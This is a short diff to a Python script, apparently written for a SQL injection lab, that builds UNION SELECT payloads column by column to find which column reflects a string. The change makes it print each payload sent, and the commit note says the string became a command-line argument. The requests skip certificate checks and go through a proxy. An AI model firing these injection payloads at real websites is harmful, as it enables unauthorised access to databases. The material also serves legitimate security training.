@@ -1,5 +1,7 @@
 """
-Working out which column contains a string string formatted object.
+Working out which column contains a string string formatted object. 
+
+Made some minor changes in my version of the script - I wanted to be able to see which payloads were being sent, and I also created the string variable as a command line argument.
 """
 
 import requests
@@ -27,6 +29,7 @@ def exploit_sqli_string_field(url, num_col):
         payload_list = ['null'] * num_col
         payload_list[i-1] = string
         sql_payload = "' union select " + ','.join(payload_list) + "--"
+        print("[+] Trying the following payload " + sql_payload)
         r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
         res = r.text
         if string.strip('\'') in res:
